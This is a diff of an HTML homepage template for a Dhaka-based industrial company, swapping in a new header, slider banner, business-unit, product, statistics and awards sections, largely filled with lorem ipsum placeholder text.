-                                            <img data-fancybox="gallery" data-animation-duration="700" data-src="#AwardISOCertification" href="javascript:;" class="card-img-top award" src="./images/2.jpg" alt="news" />
-
-                                            <div style="display: none;" id="AwardISOCertification">
-
-                                                <div class="row align-items-center sectionHalfHeight  animated fadeInDown">
-                                                    <div class="col-md-4">
-                                                        <img class="img-fluid award-img" src="storage/app/media/awards/iso-9001-2008-iso-14001-2004-certified-01.png" alt="news" />
-                                                    </div>
-                                                    <div class="col">
-                                                        <div class="card-block px-2">
-                                                            <h3 class="card-title">
-                                                                    ISO Certification
-                                                                </h3>
-                                                                <p class="card-text">
-                                                                SSG recently achieved ISO 9000 & ISO 14000 certificate for significant performance in quality management and environment management. SSG never compromise with the quality of its products. It always tries to provide the best quality products to give utmost satisfaction to valued customers. This organization also concern for the environment. So that it produces environment friendly products by following proper production guideline.</p>
-                                                        </div>
-
-                                                    </div>
-                                                </div>
-                                            </div>                                            
-                                        </div>
-                                    </div>
-                                    
-                                </div>
-                            </div>
-                        </div>
-                        
-                        
-                        <div class="carousel-item  ">
-                            <div class="row align-items-center">
-                               
-                                <div class="col achivement-items">
-                                    <div class="row">
-                                        <div class="col-6">
-                                             <img data-fancybox="gallery" data-animation-duration="700" data-src="#AwardISOCertification" href="javascript:;" class="card-img-top award" src="./images/3.jpg" alt="news" />
-
-                                            <div style="display: none;" id="AwardISOCertification">
-
-                                                <div class="row align-items-center sectionHalfHeight  animated fadeInDown">
-                                                    <div class="col-md-4">
-                                                        <img class="img-fluid award-img" src="storage/app/media/awards/award-hi-tech-industries.jpg" alt="news" />
-                                                    </div>
-                                                    <div class="col">
-                                                        <div class="card-block px-2">
-                                                            <h3 class="card-title">
-                                                                    Lorem Ipsum is a doller sit ammet
-                                                                </h3>
-                                                                <p class="card-text">
-                                                                    Lorem ipsum dolor sit amet consectetur adipisicing elit. Quam asperiores ab autem minima pariatur doloremque harum eum nihil quibusdam, excepturi commodi fugiat, est a! Ipsam saepe aut magni eveniet qui.
-                                                                </p>
-                                                        </div>
-
-                                                    </div>
-                                                </div>
-                                            </div>                                        
-                                        </div>
-                                        <div class="col-6">
-                                            <img data-fancybox="gallery" data-animation-duration="700" data-src="#AwardISOCertification" href="javascript:;" class="card-img-top award" src="./images/2.jpg" alt="news" />
-
-                                            <div style="display: none;" id="AwardISOCertification">
-
-                                                <div class="row align-items-center sectionHalfHeight  animated fadeInDown">
-                                                    <div class="col-md-4">
-                                                        <img class="img-fluid award-img" src="storage/app/media/awards/iso-9001-2008-iso-14001-2004-certified-01.png" alt="news" />
-                                                    </div>
-                                                    <div class="col">
-                                                        <div class="card-block px-2">
-                                                            <h3 class="card-title">
-                                                                    ISO Certification
-                                                                </h3>
-                                                                <p class="card-text">
-                                                                SSG recently achieved ISO 9000 & ISO 14000 certificate for significant performance in quality management and environment management. SSG never compromise with the quality of its products. It always tries to provide the best quality products to give utmost satisfaction to valued customers. This organization also concern for the environment. So that it produces environment friendly products by following proper production guideline.</p>
-                                                        </div>
-
-                                                    </div>
-                                                </div>
-                                            </div>                                            
-                                        </div>
-                                    </div>
-                                    
-                                </div>
-                            </div>
-                        </div>
-                        
-                    </div>
-                    <!-- Left and right controls -->
-                    <a class="carousel-control-prev" href="#">
-                        <span class="carousel-control-prev-icon" ></span>
-                    </a>
-                    <a class="carousel-control-next" href="#">
-                        <span class="carousel-control-next-icon"></span>
-                    </a>
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- Awards & Achivements Section End  -->
-<!-- Our Clients section -->
-<section id="our-clients"  data-aos="fade-up">
-    <div class="container">
-        <div class="row  align-items-center sectionFullHeight2">
-            <div class="col-md-5">
-            <h2>Our Valueable Clients</h2>
-            <div class="title">
-                OUR CLIENTS ARE OUR ASSETS
-            </div>
-            <div class="short-desc">
-                <p>
-                    Lorem ipsum dolor sit amet consectetur adipisicing elit. Hic aliquam quidem soluta eius modi quas, quia magni ut earum provident quasi eos enim eaque doloremque pariatur nemo eligendi quos! Deleniti!
-                </p>
-            </div>
-            </div>
-            <div class="col-md-7">
-                
-                <div id="clientsCarousel" class="carousel slide" data-ride="carousel">
-                    <!-- The slideshow -->
-                    <div class="carousel-inner">
-                        <div class="carousel-item active">
-                            <div class="row align-items-center">
-                                
-                                <div class="col">
-                                    <img class="img-fluid" src="./images/6.webp" alt="" />
-                                </div>
-                            </div>
-                        </div>
-                        <div class="carousel-item ">
-                            <div class="row align-items-center">
-                                
-                                <div class="col">
-                                    <img class="img-fluid" src="./images/4.avif" alt="" />
-                                </div>
-                            </div>
-                        </div>
-                        
-                        
-                    </div>
-
-                    <!-- Left and right controls -->
-                    <a class="carousel-control-prev" href="index.html#clientsCarousel">
-                        <span class="carousel-control-prev-icon"></span>
-                    </a>
-                    <a class="carousel-control-next" href="index.html#clientsCarousel">
-                        <span class="carousel-control-next-icon"></span>
-                    </a>
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- Our Clients section end-->
-<!-- News & Events section -->
-<section id="news-events"  data-aos="fade-up">
-    <div class="container-fluid">
-        <div class="row  sectionFullHeight">
-            <div class="col">
+            <!----Topbar End--->
+            <!----Headerbar--->
+            <div class="headerbar">
                 <div class="container">
                     <div class="row">
-                        <div class="col-md-7">
-                            <h2>News & events</h2>
+                        <div class="col " id="menu-column">
+                            <nav class="navbar navbar-expand-md bg-white navbar-white-style1 ">
+                                <a class="navbar-brand" href="index.html">
+                                    <img id="brand-logo" src="./images/promogine.png" />
+                                </a>
+                                <button class="navbar-toggler collapsed" type="button" data-toggle="collapse"
+                                    data-target="#collapsibleNavbar">
+                                    <span class="navbar-toggler-icon">
+                                    </span>
+                                    <span class="navbar-toggler-icon">
+                                    </span>
+                                    <span class="navbar-toggler-icon">
+                                    </span>
+                                </button>
+                                <div class="collapse navbar-collapse justify-content-end" id="collapsibleNavbar">
+                                    <button class="navbar-toggler close-menu" type="button" data-toggle="collapse"
+                                        data-target="#collapsibleNavbar">
+                                        <span class="navbar-toggler-icon">
+                                        </span>
+                                        <span class="navbar-toggler-icon">
+                                        </span>
+                                        <span class="navbar-toggler-icon">
+                                        </span>
+                                    </button>
+                                    <ul class="navbar-nav nav ">
+                                        <li class="nav-item  active-nav ">
+                                            <a class="nav-link" href="index.html">Home
+                                            </a>
+                                        </li>
+                                        <li class="nav-item dropdown  ">
+                                            <a id="dropdownAboutUs" href="#" data-toggle="dropdown" class="nav-link dropdown-toggle">
+                                                About Us
+                                            </a>
+                                            <div class="dropdown-menu" data-aos="fade-up">
+                                                <a class="dropdown-item" href="#">
+                                                    Company Overview
+                                                </a>
+                                                <a class="dropdown-item" href="#">
+                                                    Our Management
+                                                </a>
+                                            </div>
+                                        </li>
+                                        <li class="nav-item dropdown brandMega ">
+                                            <a id="dropdownBrand" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" class="nav-link dropdown-toggle">
+                                                Brands
+                                            </a>
+
+                                        </li>
+                                        <li class="nav-item dropdown ">
+                                            <a id="dropdownBusinessUnits" href="#" data-toggle="dropdown" class="nav-link dropdown-toggle">
+                                                Business Unit
+                                            </a>
+                                        </li>
+                                        <li class="nav-item dropdown ">
+                                            <a id="dropdownMediaCornar" href="" data-toggle="dropdown" class="nav-link dropdown-toggle">
+                                                Media Corner
+                                            </a>
+
+                                        </li>
+                                        <li class="nav-item ">
+                                            <a class="nav-link" href="#">
+                                                Career
+                                            </a>
+                                        </li>
+                                        <li class="nav-item ">
+                                            <a class="nav-link" href="#">
+                                                Contact us
+                                            </a>
+                                        </li>
+                                    </ul>
+
+                                </div>
+                            </nav>
                         </div>
-                        <div class="col-md-5"></div>
                     </div>
-                     <div class="row">
-                                        </div>
-                 </div>
+                </div>
             </div>
-        </div>
-    </div>
-    
-</section>
-<!-- News & events section end-->    </section>
-    <!-- Newsletter -->
-    <div class="download-newsletter" data-aos="fade-up">
-        <!-- Newsletter  section -->
-        <section
-        id="newsletter" style="background-image: url(themes/ssg/assets/images/download/download-bg.jpg);"> 
-          <div class="container-fluid">
-            <div class="row  align-items-center sectionHalfHeight">
-              <div class="col">
+            <!----Headerbar End--->
+
+
+            <!-- Search Popup-->
+            <!-- <div style="display: none;" class="g-search" id="g-search">
+                <script async src="https://cse.google.com/cse.js?cx=016120151646906232823:nac28eakd8s"></script>
+                <div class="gcse-search"></div>
+            </div> -->
+            <!-- Search Popup End-->
+        </section>
+
+        <!-- Content -->
+        <section id="layout-content">
+            <div id="rev_slider_1_1_wrapper" class="rev_slider_wrapper fullwidthbanner-container" data-alias="ssg"
+                data-source="gallery"
+                style="margin: 0px auto; background: transparent; padding: 0px; margin-top: 0px; margin-bottom: 0px;">
+                <!-- START REVOLUTION SLIDER  -->
+                <div id="rev_slider_1_1" class="rev_slider fullwidthabanner" style="display: none;"
+                    data-version="5.4.8.3">
+                    <ul>
+                        <!-- SLIDE  START -->
+                        <li data-index="rs-1"
+                            data-transition="slotzoom-vertical,incube-horizontal,slotzoom-horizontal,boxslide,slideremoveright"
+                            data-slotamount="default,default,default,default,default" data-hideafterloop="0"
+                            data-hideslideonmobile="off" data-easein="default,default,default,default,default"
+                            data-easeout="default,default,default,default,default"
+                            data-masterspeed="default,default,default,default,default"
+                            data-thumb="assets/001-100x50.jpg" data-rotate="0,0,0,0,0" data-saveperformance="off"
+                            data-title="Slide" data-param1="" data-param2="" data-param3="" data-param4=""
+                            data-param5="" data-param6="" data-param7="" data-param8="" data-param9="" data-param10=""
+                            data-description="">
+                            <!-- SLIDE IMAGE -->
+                            <img src="./images/1.jpg" alt="" title="001" width="1900" height="720"
+                                data-bgposition="center center" data-bgfit="100% 100%" data-bgrepeat="no-repeat"
+                                class="rev-slidebg" data-no-retina />
+                                
+                            <div class="tp-caption tp-resizeme" id="slide-1-layer-2" data-x="283" data-y="342"
+                                data-width="['auto']" data-height="['auto']" data-type="text"
+                                data-responsive_offset="on"
+                                data-frames='[{"delay":0,"speed":300,"frame":"0","from":"y:50px;opacity:0;","to":"o:1;","ease":"Power3.easeInOut"},{"delay":"wait","speed":300,"frame":"999","to":"opacity:0;","ease":"Power3.easeInOut"}]'
+                                data-textAlign="['inherit','inherit','inherit','inherit']" data-paddingtop="[0,0,0,0]"
+                                data-paddingright="[0,0,0,0]" data-paddingbottom="[0,0,0,0]"
+                                data-paddingleft="[0,0,0,0]"
+                                style="z-index: 5; white-space: nowrap; font-size: 60px; line-height: 60px; font-weight: 400; color: #ffffff; letter-spacing: 0px; font-family: Poppins; display: none;">
+                                Making <br />Your Own <br />Business
+                            </div>
+                            <div class="tp-caption tp-resizeme" id="slide-1-layer-3" data-x="285" data-y="281"
+                                data-width="['auto']" data-height="['auto']" data-type="text"
+                                data-responsive_offset="on"
+                                data-frames='[{"delay":0,"speed":300,"frame":"0","from":"y:top;","to":"o:1;","ease":"Power3.easeInOut"},{"delay":"wait","speed":300,"frame":"999","to":"opacity:0;","ease":"Power3.easeInOut"}]'
+                                data-textAlign="['inherit','inherit','inherit','inherit']" data-paddingtop="[0,0,0,0]"
+                                data-paddingright="[0,0,0,0]" data-paddingbottom="[0,0,0,0]"
+                                data-paddingleft="[0,0,0,0]"
+                                style="z-index: 6; white-space: nowrap; font-size: 35px; line-height: 45px; font-weight: 400; color: #ffffff; letter-spacing: 0px; font-family: Poppins; display: none;">
+                                Little Bit, Every Day
+                            </div>
+                        </li>
+                        <!-- SLIDE  END -->
+                        <!-- SLIDE  START -->
+                        <li data-index="rs-1"
+                            data-transition="slotzoom-vertical,incube-horizontal,slotzoom-horizontal,boxslide,slideremoveright"
+                            data-slotamount="default,default,default,default,default" data-hideafterloop="0"
+                            data-hideslideonmobile="off" data-easein="default,default,default,default,default"
+                            data-easeout="default,default,default,default,default"
+                            data-masterspeed="default,default,default,default,default"
+                            data-thumb="assets/001-100x50.jpg" data-rotate="0,0,0,0,0" data-saveperformance="off"
+                            data-title="Slide" data-param1="" data-param2="" data-param3="" data-param4=""
+                            data-param5="" data-param6="" data-param7="" data-param8="" data-param9="" data-param10=""
+                            data-description="">
+                            <!-- SLIDE IMAGE -->
+                            <img src="./images/2.jpg" alt="" title="001" width="1900" height="720"
+                                data-bgposition="center center" data-bgfit="100% 100%" data-bgrepeat="no-repeat"
+                                class="rev-slidebg" data-no-retina />
+                                
+                            <div class="tp-caption tp-resizeme" id="slide-1-layer-2" data-x="283" data-y="342"
+                                data-width="['auto']" data-height="['auto']" data-type="text"
+                                data-responsive_offset="on"
+                                data-frames='[{"delay":0,"speed":300,"frame":"0","from":"y:50px;opacity:0;","to":"o:1;","ease":"Power3.easeInOut"},{"delay":"wait","speed":300,"frame":"999","to":"opacity:0;","ease":"Power3.easeInOut"}]'
+                                data-textAlign="['inherit','inherit','inherit','inherit']" data-paddingtop="[0,0,0,0]"
+                                data-paddingright="[0,0,0,0]" data-paddingbottom="[0,0,0,0]"
+                                data-paddingleft="[0,0,0,0]"
+                                style="z-index: 5; white-space: nowrap; font-size: 60px; line-height: 60px; font-weight: 400; color: #ffffff; letter-spacing: 0px; font-family: Poppins; display: none;">
+                                MAKING<br />
+                                LIVES BETTER
+                            </div>
+                            <div class="tp-caption tp-resizeme" id="slide-1-layer-3" data-x="285" data-y="281"
+                                data-width="['auto']" data-height="['auto']" data-type="text"
+                                data-responsive_offset="on"
+                                data-frames='[{"delay":0,"speed":300,"frame":"0","from":"y:top;","to":"o:1;","ease":"Power3.easeInOut"},{"delay":"wait","speed":300,"frame":"999","to":"opacity:0;","ease":"Power3.easeInOut"}]'
+                                data-textAlign="['inherit','inherit','inherit','inherit']" data-paddingtop="[0,0,0,0]"
+                                data-paddingright="[0,0,0,0]" data-paddingbottom="[0,0,0,0]"
+                                data-paddingleft="[0,0,0,0]"
+                                style="z-index: 6; white-space: nowrap; font-size: 35px; line-height: 45px; font-weight: 400; color: #ffffff; letter-spacing: 0px; font-family: Poppins; display: none;">
+                                LITTLE BIT, EVERY DAY
+                            </div>
+                        </li>
+                        <!-- SLIDE  END -->
+                        <!-- SLIDE  START -->
+                        <li data-index="rs-1"
+                            data-transition="slotzoom-vertical,incube-horizontal,slotzoom-horizontal,boxslide,slideremoveright"
+                            data-slotamount="default,default,default,default,default" data-hideafterloop="0"
+                            data-hideslideonmobile="off" data-easein="default,default,default,default,default"
+                            data-easeout="default,default,default,default,default"
+                            data-masterspeed="default,default,default,default,default"
+                            data-thumb="assets/001-100x50.jpg" data-rotate="0,0,0,0,0" data-saveperformance="off"
+                            data-title="Slide" data-param1="" data-param2="" data-param3="" data-param4=""
+                            data-param5="" data-param6="" data-param7="" data-param8="" data-param9="" data-param10=""
+                            data-description="">
+                            <!-- SLIDE IMAGE -->
+                            <img src="./images/3.jpg" alt="" title="001" width="1900" height="720"
+                                data-bgposition="center center" data-bgfit="100% 100%" data-bgrepeat="no-repeat"
+                                class="rev-slidebg" data-no-retina />
+                                
+                            <div class="tp-caption tp-resizeme" id="slide-1-layer-2" data-x="283" data-y="342"
+                                data-width="['auto']" data-height="['auto']" data-type="text"
+                                data-responsive_offset="on"
+                                data-frames='[{"delay":0,"speed":300,"frame":"0","from":"y:50px;opacity:0;","to":"o:1;","ease":"Power3.easeInOut"},{"delay":"wait","speed":300,"frame":"999","to":"opacity:0;","ease":"Power3.easeInOut"}]'
+                                data-textAlign="['inherit','inherit','inherit','inherit']" data-paddingtop="[0,0,0,0]"
+                                data-paddingright="[0,0,0,0]" data-paddingbottom="[0,0,0,0]"
+                                data-paddingleft="[0,0,0,0]"
+                                style="z-index: 5; white-space: nowrap; font-size: 60px; line-height: 60px; font-weight: 400; color: #ffffff; letter-spacing: 0px; font-family: Poppins; display: none;">
+                                MAKING<br />
+                                LIVES BETTER
+                            </div>
+                            <div class="tp-caption tp-resizeme" id="slide-1-layer-3" data-x="285" data-y="281"
+                                data-width="['auto']" data-height="['auto']" data-type="text"
+                                data-responsive_offset="on"
+                                data-frames='[{"delay":0,"speed":300,"frame":"0","from":"y:top;","to":"o:1;","ease":"Power3.easeInOut"},{"delay":"wait","speed":300,"frame":"999","to":"opacity:0;","ease":"Power3.easeInOut"}]'
+                                data-textAlign="['inherit','inherit','inherit','inherit']" data-paddingtop="[0,0,0,0]"
+                                data-paddingright="[0,0,0,0]" data-paddingbottom="[0,0,0,0]"
+                                data-paddingleft="[0,0,0,0]"
+                                style="z-index: 6; white-space: nowrap; font-size: 35px; line-height: 45px; font-weight: 400; color: #ffffff; letter-spacing: 0px; font-family: Poppins; display: none;">
+                                LITTLE BIT, EVERY DAY
+                            </div>
+                        </li>
+                        <!-- SLIDE  END -->
+                    </ul>
+                    <div class="tp-bannertimer tp-bottom" style="visibility: hidden !important;"></div>
+                </div>
+            </div>
+
+            <!-- business unit  -->
+            <section id="business-unit" data-aos="fade-up">
                 <div class="container">
-                  <div class="row">
-                    <div class="col">
-                      <div class="newletter">
-                        <h2>
-                          Download<br />
-                            Newsletter
-                        </h2>
-                        <p class="title">TO GET DETAIL PRODUCT AND ESSENTIAL COMPANY INFORMATION<br><br><br>
-                          <a href="#" class="submit-btn align-items-center"/>View All</a></div>
+                    <div class="row  align-items-center sectionFullHeight">
+                        <div class="col">
+                            <h2>Business Units</h2>
+                            <div id="businessUnitCarousel" class="carousel slide" data-ride="carousel">
 
+                                <!-- The slideshow -->
+                                <div class="carousel-inner">
 
+                                    <div class="carousel-item active">
+                                        <div class="row">
+                                            <div class="col-md">
+                                                <img class="slide-item" src="./images/2.jpg" alt="" width="300" />
+                                            </div>
+                                            <div class="col-md">
+                                                <h3>Lorem Ipsum <br>Lorem ipsum is a doller sit ammet</h3>
+                                                <div class="title text-uppercase">Lorem ipsum is a doller sit ammet
+                                                </div>
+                                                <p class="short-desc">Lorem ipsum, dolor sit amet consectetur
+                                                    adipisicing elit. Quaerat laudantium corrupti quasi repudiandae,
+                                                    consectetur quis ea laborum nostrum omnis atque, esse qui. Assumenda
+                                                    harum veritatis beatae id. Esse, repudiandae saepe.</p>
+                                                <a class="visit-link" href="#">
+                                                    <img src="#" />Know More
+                                                </a>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="carousel-item ">
+                                        <div class="row">
+                                            <div class="col-md">
+                                                <img class="slide-item" src="./images/1.jpg" alt="" width="300" />
+                                            </div>
+                                            <div class="col-md">
+                                                <h3>Lorem Ipsum <br>Lorem ipsum is a doller sit ammet</h3>
+                                                <div class="title text-uppercase">Lorem ipsum is a doller sit ammet
+                                                </div>
+                                                <p class="short-desc">Lorem ipsum, dolor sit amet consectetur
+                                                    adipisicing elit. Quaerat laudantium corrupti quasi repudiandae,
+                                                    consectetur quis ea laborum nostrum omnis atque, esse qui. Assumenda
+                                                    harum veritatis beatae id. Esse, repudiandae saepe.</p>
+                                                <a class="visit-link" href="#">
+                                                    <img src="#" />Know More
+                                                </a>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                </div>
+
+                                <!-- Left and right controls -->
+                                <a class="carousel-control-prev carousel_button" href="#">
+                                    <i class="fa fa-angle-left"></i>
+                                </a>
+                                <a class="carousel-control-next carousel_button" href="#">
+                                    <i class="fa fa-angle-right"></i>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <!-- end business unit  -->
+             
+            <!-- Our products section -->
+            <section id="our-brands" data-aos="fade-up">
+                <div class="container-fluid">
+                    <div class="row  align-items-center sectionHalfHeight">
+                        <div class="col">
+                            <h2>Our Products</h2>
+                            <div id="productsCarousel" class="carousel slide" data-ride="carousel">
+                                <!-- The slideshow -->
+                                <div class="carousel-inner">
+                                    <div class="carousel-item active animated zoomIn">
+                                        <div class="row">
+                                            <div class="col-md">
+                                                <img class="img-fluid brand-logo-thumb" src="./images/4.avif" />
+                                                <div class="title">
+                                                    Our flagship brand from the house of Balaji
+                                                    Industries Ltd.
+                                                </div>
+                                                <p class="short-desc">
+                                                    Lorem ipsum dolor sit amet consectetur adipisicing elit. Eos ut.
+                                                </p>
+                                                <a class="visit-link" href="#">
+                                                    VISIT SITE <i class="fa-solid fa-circle-arrow-right"></i>
+                                                </a>
+                                            </div>
+
+                                        </div>
+                                    </div>
+
+                                    <div class="carousel-item  animated zoomIn">
+                                        <div class="row">
+                                            <div class="col-md">
+                                                <img class="img-fluid brand-logo-thumb" src="./images/3.jpg" />
+                                                <div class="title">Our flagship brand from the house of Balaji
+                                                    Industries Ltd.</div>
+                                                <p class="short-desc">
+                                                    Lorem ipsum dolor sit amet consectetur adipisicing elit. Eos ut.
+                                                </p>
+                                                <a class="visit-link" href="#"><img src="#" alt="" />VISIT SITE
+                                                </a>
+                                            </div>
+
+                                        </div>
+                                    </div>
+
+                                </div>
+                                <!-- Left and right controls -->
+                                <a class="carousel-control-prev carousel_button" href="#">
+                                    <i class="fa fa-angle-left"></i>
+                                </a>
+                                <a class="carousel-control-next carousel_button" href="#">
+                                    <i class="fa fa-angle-right"></i>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <!-- Our products end  -->
+             
+            <!-- Business growth section -->
+            <section id="business-growth" data-aos="fade-up">
+                <div class="container-fluid">
+                    <div class="row  align-items-center sectionHalfHeight">
+                        <div class="col-12">
+                            <div class="container">
+                                <div class="row mb-4">
+                                    
+                                    <div class="col-md-3 col-sm-6">
+                                        <img class="large-icon" src="storage/app/media/icons/years-vector.png" alt="" />
+
+                                        <div id="years" class="count">50</div>
+                                        <div class="year">Years</div>
+                                        <div class="short-desc">
+                                            Lorem Ipsum is a doller sit ammet
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="col-md-3 col-sm-6">
+                                        <img class="large-icon" src="storage/app/media/icons/district-vector.png"
+                                            alt="" />
+                                        <div id="districts" class="count">64</div>
+                                        <div class="year">Districts</div>
+                                        <div class="short-desc">
+                                            Lorem Ipsum is a doller sit ammet
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="col-md-3 col-sm-6">
+                                        <img class="large-icon" src="storage/app/media/icons/familly-vector.png" alt="" />
+                                        <div id="families"><span class="count">100</span>M</div>
+                                        <div class="year">Families</div>
+                                        <div class="short-desc">
+                                            Lorem Ipsum is a doller sit ammet
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="col-md-3 col-sm-6">
+                                        <img class="large-icon" src="storage/app/media/icons/employee-vector.png"alt="" />
+
+                                        <div id="employees"><span class="count">50000</span>+</div>
+                                        <div class="year">Employees</div>
+                                        <div class="short-desc">
+                                            Lorem Ipsum is a doller sit ammet
+                                        </div>
+                                    </div>
                                 </div>
                             </div>
                         </div>
                     </div>
                 </div>
-            </div>
-            </div>
-        </section>
-      <!-- Newsletter section end-->    </div>
-    <!-- Footer -->
-    <footer class="page-footer font-small mdb-color pt-4" data-aos="fade-up">
-            <!-- Footer Section start  -->
-      <!-- Footer -->
-      
-        <!-- Footer Links -->
-        <div class="container text-center text-md-left">
-          <!-- Footer links -->
-          <div class="row text-center text-md-left mt-3 pb-3">
-            <!-- Grid column -->
-            <div class="col-md-2 col-lg-2 col-xl-2 mx-auto">
-              <!-- <img class="img-fluid" src="themes/ssg/assets/images/ssg-logo-white.png" alt="" /><br> -->
-              
-              <p class="mt-4">
-                  <i class="fas fa-home mr-3"></i> Balaji Industries Limited. <br>                  
-                  Lilypond Center, 3 R.K Mission Road, Dhaka
-              </p>
-              <p><i class="fas fa-envelope mr-3"></i> info@example.com</p>
-              <p><i class="fas fa-phone mr-3"></i> <a href="#"> +8801607249358</a></p>
-            </div>
-            <!-- Grid column -->
-
-            <hr class="w-100 clearfix d-md-none" />
-
-            <!-- Grid column -->
-            <div class="col-md-2 col-lg-2 col-xl-2 mx-auto mt-3">
-              <h6 class="text-uppercase mb-4 font-weight-bold">About Us</h6>
-              <p>
-                <a  href="about-us">Company Overview</a>
-              </p>
-              <p>
-                <a href="our-management">Our Management</a>
-              </p>
-              
-              </div>
-                                        <!-- Grid column -->
-
-              <hr class="w-100 clearfix d-md-none" />
-
-            <!-- Grid column -->
-            <div class="col-md-2 col-lg-2 col-xl-2 mx-auto mt-3">
-                                            <h6 class="text-uppercase mb-4 font-weight-bold">Brands</h6>
-                                            <p>
-                                                <a href="#">Super Star</a>
-                                            </p>
-                                            <p>
-                                                <a href="#">Roots</a>
-                                            </p>
-                                            <p>
-                                                <a href="#">Orlee</a>
-                                            </p>
-                                            <p>
-                                                <a href="#">Blink</a>
-                                            </p>
-                                            <p>
-                                                <a href="#">Super Star Tissue</a>
-                                            </p>
-            </div>
-
-            <!-- Grid column -->
-            <hr class="w-100 clearfix d-md-no ">  
-            <!-- Grid column -->
-            <!-- <div class="col-md-2 col-lg-2 col-xl-2 mx-auto mt-3">
-                                            <h6 class="text-uppercase mb-4 font-weight-bold">MEDIA CORNER</h6>
-                                            <p>
-                                                <a href="#">Awards & Achievements</a>
-                                            </p>
-                                            <p>
-                                                <a href="#">Media Center </a>
-                                            </p>
-                                            <p>
-                                                <a href="#">News & Events</a>
-                                            </p>
-                                            
-            </div> -->
-            <!-- Grid column -->
-            <!-- Grid column -->
-            <hr class="w-100 clearfix d-md-no">  
-            <!-- Grid column -->
-            <!-- <div class="col-md-2 col-lg-2 col-xl-2 mx-auto mt-3">
-                                            <h6 class="text-uppercase mb-4 font-weight-bold">Information</h6>
-                                            <p>
-                                                <a href="#">Career</a>
-                                            </p>
-                                            <p>
-                                                <a href="#">Terms & Conditions</a>
-                                            </p>
-                                            <p>
-                                                <a href="#">Privacy Policy</a>
-                                            </p>
-                                            <p>
-                                                <a href="#">Contact Us</a>
-                                            </p>
-            </div> -->
-            <!-- Grid column -->
-            <!-- Grid column -->
-            <hr class="w-100 clearfix d-md-no ">  
-            <!-- Grid column -->
-            <!-- <div class="col-md-2 col-lg-2 col-xl-2 mx-auto mt-3">
-                                            <h6 class="text-uppercase mb-4 font-weight-bold">Other Links</h6>
-                                            
-                                            <p>
-                                                <a href="#">Become an Affiliate</a>
-                                            </p>
-                                           
-            </div> -->
-            <!-- Grid column -->
-            </div>
-        <!-- Footer links -->
-
-        <hr />
-
-        <!-- Grid row -->
-        <div class="row d-flex align-items-center">
-                                    <!-- Grid column -->
-                                    <div class="col-md-7 col-lg-8">
-                                        <!--Copyright-->
-                                        <p class="text-center text-md-left">
-                                            © 2025 Copyright:
-                                            <a href="index.html#">
-                                                <strong> Your Company.com</strong>
-                                            </a>
-                                        </p>
-                                    </div>
-                                    <!-- Grid column -->
-
-                                    <!-- Grid column -->
+            </section>
+            <!-- Business Growth Section End  -->
+             
+            <!-- Awards & achivements section -->
+            <section id="awards-achivement" data-aos="fade-up">
+                <div class="container">
+                    <div class="row  align-items-center sectionFullHeight2">
+                        <!--left content-->
+                        <div class="col-md-5">
+                            <h2>Our Achievements</h2>
+                            <div class="title">
+                                Achievements that tells our story behind the scene.
+                            </div>
+                            <div class="short-desc">
+                                <p>
+                                    Lorem ipsum dolor sit amet consectetur adipisicing elit. Hic aliquam quidem soluta
+                                    eius modi quas, quia magni ut earum provident quasi eos enim eaque doloremque
+                                    pariatur nemo eligendi quos! Deleniti!
+                                </p>
+                            </div>
+                        </div>
+                        
+                        <!--right content-->
+                        <div class="col-md-7">
+                            <div id="awardsCarousel" class="carousel slide " data-ride="carousel">
+                                <!-- The slideshow -->
+                                <div class="carousel-inner ">
                                     
-                                    <!-- Grid column -->
+                                    <div class="carousel-item active ">
+                                        <div class="row align-items-center">
+
+                                            <div class="col achivement-items">
+                                                <div class="row">
+                                                    <div class="col-6">
+                                                        <img data-fancybox="gallery" data-animation-duration="700"
+                                                            data-src="#AwardISOCertification" href="javascript:;"
+                                                            class="card-img-top award" src="./images/1.jpg"
+                                                            alt="news" />
+
+                                                        <div style="display: none;" id="AwardISOCertification">
+
+                                                            <div
+                                                                class="row align-items-center sectionHalfHeight  animated fadeInDown">
+                                                                <div class="col-md-4">
+                                                                    <img class="img-fluid award-img"
+                                                                        src="storage/app/media/awards/award-hi-tech-industries.jpg"
+                                                                        alt="news" />
+                                                                </div>
+                                                                <div class="col">
+                                                                    <div class="card-block px-2">
+                                                                        <h3 class="card-title">
+                                                                            Lorem Ipsum is a doller sit ammet
+                                                                        </h3>
+                                                                        <p class="card-text">
+                                                                            Lorem ipsum dolor sit amet consectetur
+                                                                            adipisicing elit. Quam asperiores ab autem
+                                                                            minima pariatur doloremque harum eum nihil
+                                                                            quibusdam, excepturi commodi fugiat, est a!
+                                                                            Ipsam saepe aut magni eveniet qui.
+                                                                        </p>
+                                                                    </div>
+
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="col-6">
+                                                        <img data-fancybox="gallery" data-animation-duration="700"
+                                                            data-src="#AwardISOCertification" href="javascript:;"
+                                                            class="card-img-top award" src="./images/2.jpg"
+                                                            alt="news" />
+
+                                                        <div style="display: none;" id="AwardISOCertification">
+
+                                                            <div
+                                                                class="row align-items-center sectionHalfHeight  animated fadeInDown">
+                                                                <div class="col-md-4">
+                                                                    <img class="img-fluid award-img"
+                                                                        src="storage/app/media/awards/iso-9001-2008-iso-14001-2004-certified-01.png"
+                                                                        alt="news" />
+                                                                </div>
+                                                                <div class="col">
+                                                                    <div class="card-block px-2">
+                                                                        <h3 class="card-title">
+                                                                            ISO Certification
+                                                                        </h3>
+                                                                        <p class="card-text">
+                                                                            SSG recently achieved ISO 9000 & ISO 14000
+                                                                            certificate for significant performance in
+                                                                            quality management and environment
+                                                                            management. SSG never compromise with the
+                                                                            quality of its products. It always tries to
+                                                                            provide the best quality products to give
+                                                                            utmost satisfaction to valued customers.
+                                                                            This organization also concern for the
+                                                                            environment. So that it produces environment
+                                                                            friendly products by following proper
+                                                                            production guideline.</p>
+                                                                    </div>
+
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                            </div>
+                                        </div>
+                                    </div>
